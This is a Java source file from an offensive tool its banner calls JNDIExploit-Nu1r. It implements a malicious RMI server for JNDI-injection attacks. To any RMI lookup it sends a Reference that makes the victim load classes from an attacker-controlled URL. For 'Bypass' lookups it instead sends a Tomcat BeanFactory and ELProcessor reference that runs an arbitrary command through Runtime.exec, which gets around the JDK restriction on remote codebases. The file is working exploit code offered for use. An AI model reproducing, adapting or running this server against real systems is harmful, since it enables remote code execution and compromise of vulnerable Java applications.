package com.nu1r.jndi;


import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.ObjectStreamClass;
import java.io.OutputStream;
import java.lang.reflect.Field;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;
import java.net.URL;
import java.net.URLClassLoader;
import java.rmi.MarshalException;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObject;
import java.rmi.server.UID;
import java.util.Arrays;

import javax.naming.Reference;
import javax.naming.StringRefAddr;
import javax.net.ServerSocketFactory;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import com.nu1r.jndi.utils.Config;
import com.nu1r.jndi.gadgets.utils.Reflections;
import com.sun.jndi.rmi.registry.ReferenceWrapper;

import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import org.apache.naming.ResourceRef;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.context.request.RequestAttributes;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import sun.rmi.server.UnicastServerRef;
import sun.rmi.transport.TransportConstants;

import static org.fusesource.jansi.Ansi.ansi;


/**
 * Generic JRMP listener
 * <p>
 * JRMP Listener that will respond to RMI lookups with a Reference that specifies a remote object factory.
 * <p>
 * This technique was mitigated against by no longer allowing remote codebases in references by default in Java 8u121.
 *
 * @author mbechler
 */
@SuppressWarnings({
        "restriction"
})
public class RMIServer extends InMemoryOperationInterceptor implements Runnable {

    private final ServerSocket ss;
    private final Object       waitLock = new Object();
    private       boolean      exit;
    private final URL          classpathUrl;


    public RMIServer(int port, URL classpathUrl) throws IOException {
        this.classpathUrl = classpathUrl;
        this.ss = ServerSocketFactory.getDefault().createServerSocket(port);
    }


    /**
     *
     */
    public void close() {
        this.exit = true;
        try {
            this.ss.close();
        } catch (IOException ignored) {
        }
        synchronized (this.waitLock) {
            this.waitLock.notify();
        }
    }


    public static void start() {
        String url = "http://" + Config.ip + ":" + Config.rmiPort;

        try {
            System.out.println(ansi().render("@|green [+]|@ @|MAGENTA RMI  Server Start Listening on >> |@" + Config.rmiPort + "..."));
            RMIServer c = new RMIServer(Config.rmiPort, new URL(url));
            c.run();
        } catch (Exception e) {
            System.err.println("Listener error");
            e.printStackTrace(System.err);
        }
    }


    @Override
    public void run() {
        try {
            Socket s = null;
            try {
                while (!this.exit && (s = this.ss.accept()) != null) {
                    try {
                        s.setSoTimeout(5000);
                        InetSocketAddress remote = (InetSocketAddress) s.getRemoteSocketAddress();
                        System.err.println("[+] Have connection from " + remote);

                        InputStream is    = s.getInputStream();
                        InputStream bufIn = is.markSupported() ? is : new BufferedInputStream(is);

                        // Read magic (or HTTP wrapper)
                        bufIn.mark(4);
                        try (DataInputStream in = new DataInputStream(bufIn)) {
                            int magic = in.readInt();

                            short version = in.readShort();
                            if (magic != TransportConstants.Magic || version != TransportConstants.Version) {
                                s.close();
                                continue;
                            }

                            OutputStream         sockOut = s.getOutputStream();
                            BufferedOutputStream bufOut  = new BufferedOutputStream(sockOut);
                            try (DataOutputStream out = new DataOutputStream(bufOut)) {

                                byte protocol = in.readByte();
                                switch (protocol) {
                                    case TransportConstants.StreamProtocol:
                                        out.writeByte(TransportConstants.ProtocolAck);
                                        if (remote.getHostName() != null) {
                                            out.writeUTF(remote.getHostName());
                                        } else {
                                            out.writeUTF(remote.getAddress().toString());
                                        }
                                        out.writeInt(remote.getPort());
                                        out.flush();
                                        in.readUTF();
                                        in.readInt();
                                    case TransportConstants.SingleOpProtocol:
                                        doMessage(s, in, out);
                                        break;
                                    default:
                                    case TransportConstants.MultiplexProtocol:
                                        System.err.println("Unsupported protocol");
                                        s.close();
                                        continue;
                                }

                                bufOut.flush();
                                out.flush();
                            }
                        }
                    } catch (InterruptedException e) {
                        return;
                    } catch (Exception e) {
                        e.printStackTrace(System.err);
                    } finally {
                        System.err.println("Closing connection");
                        s.close();
                    }

                }

            } finally {
                if (s != null) {
                    s.close();
                }
                if (this.ss != null) {
                    this.ss.close();
                }
            }

        } catch (SocketException ignored) {
        } catch (Exception e) {
            e.printStackTrace(System.err);
        }
    }

    private void doMessage(Socket s, DataInputStream in, DataOutputStream out) throws Exception {
        System.err.println(" RMI  服务器  >> 正在读取信息");

        int op = in.read();

        switch (op) {
            case TransportConstants.Call:
                // service incoming RMI call
                doCall(in, out);
                break;

            case TransportConstants.Ping:
                // send ack for ping
                out.writeByte(TransportConstants.PingAck);
                break;

            case TransportConstants.DGCAck:
                UID.read(in);
                break;

            default:
                throw new IOException(" RMI  服务器  >> 无法识别：" + op);
        }

        s.close();
    }

    private void doCall(DataInputStream in, DataOutputStream out) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(in) {

            @Override
            protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException {
                if ("[Ljava.rmi.server.ObjID;".equals(desc.getName())) {
                    return ObjID[].class;
                } else if ("java.rmi.server.ObjID".equals(desc.getName())) {
                    return ObjID.class;
                } else if ("java.rmi.server.UID".equals(desc.getName())) {
                    return UID.class;
                } else if ("java.lang.String".equals(desc.getName())) {
                    return String.class;
                }
                throw new IOException(" RMI  服务器  >> 无法读取 Object");
            }
        };

        ObjID read;
        try {
            read = ObjID.read(ois);
        } catch (java.io.IOException e) {
            throw new MarshalException(" RMI  服务器  >> 无法读取 ObjID", e);
        }

        if (read.hashCode() == 2) {
            // DGC
            handleDGC(ois);
        } else if (read.hashCode() == 0) {
            if (handleRMI(ois, out)) {
                synchronized (this.waitLock) {
                    this.waitLock.notifyAll();
                }
            }
        }

    }

    private boolean handleRMI(ObjectInputStream ois, DataOutputStream out) throws Exception {
        int method = ois.readInt(); // method
        ois.readLong(); // hash

        if (method != 2) { // lookup
            return false;
        }

        String object = (String) ois.readObject();
        System.out.println(ansi().eraseScreen().render(
                "   @|green █████\\|@ @|red ██\\   ██\\|@ @|yellow ███████\\|@  @|MAGENTA ██████\\|@       @|CYAN ██\\   ██\\ ██\\   ██\\|@ \n" +
                        "   @|green \\__██ ||@@|red ███\\  ██ ||@@|yellow ██  __██\\|@ @|MAGENTA \\_██  _||@      @|CYAN ███\\  ██ |██ |  ██ ||@ @|BG_GREEN v1.5.6|@\n" +
                        "      @|green ██ ||@@|red ████\\ ██ ||@@|yellow ██ |  ██ ||@  @|MAGENTA ██ ||@        @|CYAN ████\\ ██ |██ |  ██ ||@ @|BG_CYAN JNDIExploit-Nu1r|@\n" +
                        "      @|green ██ ||@@|red ██ ██\\██ ||@@|yellow ██ |  ██ ||@  @|MAGENTA ██ ||@██████\\ @|CYAN ██ ██\\██ |██ |  ██ ||@\n" +
                        "@|green ██\\   ██ ||@@|red ██ \\████ ||@@|yellow ██ |  ██ ||@  @|MAGENTA ██ ||@\\______|@|CYAN ██ \\████ |██ |  ██ ||@\n" +
                        "@|green ██ |  ██ ||@@|red ██ |\\███ ||@@|yellow ██ |  ██ ||@  @|MAGENTA ██ ||@        @|CYAN ██ |\\███ |██ |  ██ ||@\n" +
                        "@|green \\██████  ||@@|red ██ | \\██ ||@@|yellow ███████  ||@@|MAGENTA ██████\\|@       @|CYAN ██ | \\██ |\\██████  ||@\n" +
                        "@|green  \\______/|@@|red  \\__|  \\__||@@|yellow \\_______/|@ @|MAGENTA \\______||@      @|CYAN \\__|  \\__| \\______/|@"));
        System.out.println(ansi().render(Ltime.getLocalTime() + "@|bg_GREEN -----------------------------------------------------------------------------------|@"));
        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA RMI  服务器  >> RMI 查询 |@" + object + " " + method));
        out.writeByte(TransportConstants.Return); // transport op
        try (ObjectOutputStream oos = new MarshalOutputStream(out, this.classpathUrl)) {

            oos.writeByte(TransportConstants.NormalReturn);
            new UID().write(oos);

            //反射调用的类名
            ReferenceWrapper rw = Reflections.createWithoutConstructor(ReferenceWrapper.class);

            if (object.startsWith("Bypass")) {
                System.out.println(ansi().render("@|green [+]|@ @|MAGENTA RMI  服务器  >> 发送本地类加载引用|@"));
                Reflections.setFieldValue(rw, "wrappee", execByEL());
            } else {
                System.out.println(ansi().render("@|green [+]|@ @|MAGENTA RMI  服务器  >> 向目标发送 stub >>|@ %s", new URL(this.classpathUrl, this.classpathUrl.getRef().replace('.', '/').concat(".class"))));
                Reflections.setFieldValue(rw, "wrappee", new Reference("Foo", this.classpathUrl.getRef(), this.classpathUrl.toString()));
            }

            Field refF = RemoteObject.class.getDeclaredField("ref");
            refF.setAccessible(true);
            refF.set(rw, new UnicastServerRef(12345));

            oos.writeObject(rw);

            oos.flush();
            out.flush();
        }
        return true;
    }

    public static void main(String[] args) throws Exception {
        ReferenceWrapper rw = Reflections.createWithoutConstructor(ReferenceWrapper.class);
        Reflections.setFieldValue(rw, "wrappee", execByEL());
    }

    @Autowired
    public static ResourceRef execByEL() {

        RequestAttributes requestAttributes = RequestContextHolder.getRequestAttributes();
        HttpServletRequest  httprequest  = ((ServletRequestAttributes) requestAttributes).getRequest();
        HttpServletResponse httpresponse = ((ServletRequestAttributes) requestAttributes).getResponse();

        String cmd = httprequest.getHeader("nu1r");
        ResourceRef                   ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", String.format(
                "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(" +
                        "\"java.lang.Runtime.getRuntime().exec('%s')\"" +
                        ")",
                Config.command
        )));

        return ref;
    }

    private static void handleDGC(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ois.readInt(); // method
        ois.readLong(); // hash
        System.err.println("Is DGC call for " + Arrays.toString((ObjID[]) ois.readObject()));
    }


    static final class MarshalOutputStream extends ObjectOutputStream {

        private final URL sendUrl;


        public MarshalOutputStream(OutputStream out, URL u) throws IOException {
            super(out);
            this.sendUrl = u;
        }


        @Override
        protected void annotateClass(Class<?> cl) throws IOException {
            if (this.sendUrl != null) {
                writeObject(this.sendUrl.toString());
            } else if (!(cl.getClassLoader() instanceof URLClassLoader)) {
                writeObject(null);
            } else {
                URL[]         us = ((URLClassLoader) cl.getClassLoader()).getURLs();
                StringBuilder cb = new StringBuilder();

                for (URL u : us) {
                    cb.append(u.toString());
                }
                writeObject(cb.toString());
            }
        }


        /**
         * Serializes a location from which to load the specified class.
         */
        @Override
        protected void annotateProxyClass(Class<?> cl) throws IOException {
            annotateClass(cl);
        }
    }
}
